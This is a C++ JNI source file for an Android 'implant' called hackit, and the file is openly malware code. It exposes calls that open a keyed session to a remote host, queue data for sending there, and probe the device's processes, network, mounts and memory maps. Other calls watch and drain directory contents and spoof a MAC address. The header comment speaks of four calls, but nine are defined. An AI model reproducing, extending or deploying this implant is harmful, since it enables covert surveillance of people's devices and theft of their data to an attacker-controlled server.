// JNI surface. Small on purpose: four calls the implant actually uses.
#include "hackit.h"

#include <jni.h>
#include <cstring>
#include <string>
#include <vector>

namespace {
hackit::Session g_session;
bool g_ready = false;
std::string g_host;
uint16_t g_port = 0;
std::string g_sid;
}

extern "C" {

JNIEXPORT jboolean JNICALL
Java_com_hackit_agent_NativeBridge_nativeInit(JNIEnv *env, jobject, jbyteArray psk, jstring host,
                                              jint port, jstring sid) {
    if (g_ready) return JNI_TRUE;
    if (psk == nullptr || host == nullptr || sid == nullptr) return JNI_FALSE;
    jsize length = env->GetArrayLength(psk);
    if (length != (jsize)32) return JNI_FALSE;
    std::vector<uint8_t> key((size_t)length);
    env->GetByteArrayRegion(psk, 0, length, reinterpret_cast<jbyte *>(key.data()));
    const char *host_chars = env->GetStringUTFChars(host, nullptr);
    const char *sid_chars = env->GetStringUTFChars(sid, nullptr);
    std::string host_value = host_chars ? host_chars : "";
    std::string sid_value = sid_chars ? sid_chars : "";
    if (host_chars) env->ReleaseStringUTFChars(host, host_chars);
    if (sid_chars) env->ReleaseStringUTFChars(sid, sid_chars);
    if (host_value.empty() || sid_value.empty() || port <= 0) return JNI_FALSE;

    g_host = host_value;
    g_port = (uint16_t)port;
    g_sid = sid_value;
    g_ready = hackit::session_init(g_session, g_host, g_port, key, g_sid);
    if (g_ready) hackit::native_start(g_session);
    return g_ready ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jint JNICALL Java_com_hackit_agent_NativeBridge_nativeSend(JNIEnv *env, jobject, jstring json) {
    if (!g_ready || json == nullptr) return -1;
    const char *chars = env->GetStringUTFChars(json, nullptr);
    std::string payload = chars ? chars : "";
    if (chars) env->ReleaseStringUTFChars(json, chars);
    if (payload.empty()) return -1;
    return hackit::native_enqueue(payload, 1);
}

JNIEXPORT jstring JNICALL Java_com_hackit_agent_NativeBridge_nativeState(JNIEnv *env, jobject) {
    std::string state = g_ready ? hackit::session_state(g_session) : "{\"ready\":false}";
    return env->NewStringUTF(state.c_str());
}

JNIEXPORT jstring JNICALL Java_com_hackit_agent_NativeBridge_nativeProbe(JNIEnv *env, jobject,
                                                                        jstring kind) {
    const char *chars = kind ? env->GetStringUTFChars(kind, nullptr) : nullptr;
    std::string which = chars ? chars : "snapshot";
    if (chars) env->ReleaseStringUTFChars(kind, chars);
    std::string out;
    try {
        if (which == "maps") out = hackit::probe_maps();
        else if (which == "status") out = hackit::probe_status();
        else if (which == "net") out = hackit::probe_net();
        else if (which == "mounts") out = hackit::probe_mounts();
        else if (which == "cpu") out = hackit::probe_cpu();
        else if (which == "proc") out = hackit::probe_proc_list();
        else out = hackit::probe_snapshot();
    } catch (const std::exception &exc) {
        out = std::string("{\"error\":\"") + hackit::json_escape(exc.what()) + "\"}";
    }
    return env->NewStringUTF(out.c_str());
}

JNIEXPORT jboolean JNICALL Java_com_hackit_agent_NativeBridge_nativeWatch(JNIEnv *env, jobject,
                                                                          jstring directory) {
    if (!directory) return JNI_FALSE;
    const char *chars = env->GetStringUTFChars(directory, nullptr);
    std::string path = chars ? chars : "";
    if (chars) env->ReleaseStringUTFChars(directory, chars);
    if (path.empty()) return JNI_FALSE;
    return hackit::watch_start(path) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL Java_com_hackit_agent_NativeBridge_nativeWatchAdd(JNIEnv *env, jobject,
                                                                            jstring directory) {
    if (!directory) return JNI_FALSE;
    const char *chars = env->GetStringUTFChars(directory, nullptr);
    std::string path = chars ? chars : "";
    if (chars) env->ReleaseStringUTFChars(directory, chars);
    if (path.empty()) return JNI_FALSE;
    return hackit::watch_add(path) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jstring JNICALL Java_com_hackit_agent_NativeBridge_nativeSpoofMac(JNIEnv *env, jobject,
                                                                                 jstring interface_name,
                                                                                 jstring mac) {
    const char *iface_chars = interface_name ? env->GetStringUTFChars(interface_name, nullptr) : nullptr;
    const char *mac_chars = mac ? env->GetStringUTFChars(mac, nullptr) : nullptr;
    std::string iface = iface_chars ? iface_chars : "";
    std::string mac_value = mac_chars ? mac_chars : "";
    if (iface_chars) env->ReleaseStringUTFChars(interface_name, iface_chars);
    if (mac_chars) env->ReleaseStringUTFChars(mac, mac_chars);
    std::string out = hackit::spoof_mac(iface, mac_value);
    return env->NewStringUTF(out.c_str());
}

JNIEXPORT jstring JNICALL Java_com_hackit_agent_NativeBridge_nativeWatchDrain(JNIEnv *env, jobject) {
    std::string out = hackit::watch_drain();
    return env->NewStringUTF(out.c_str());
}

JNIEXPORT void JNICALL Java_com_hackit_agent_NativeBridge_nativeStop(JNIEnv *, jobject) {
    hackit::native_stop();
    if (g_ready) {
        hackit::session_close(g_session);
        g_ready = false;
    }
}

}  // extern "C"
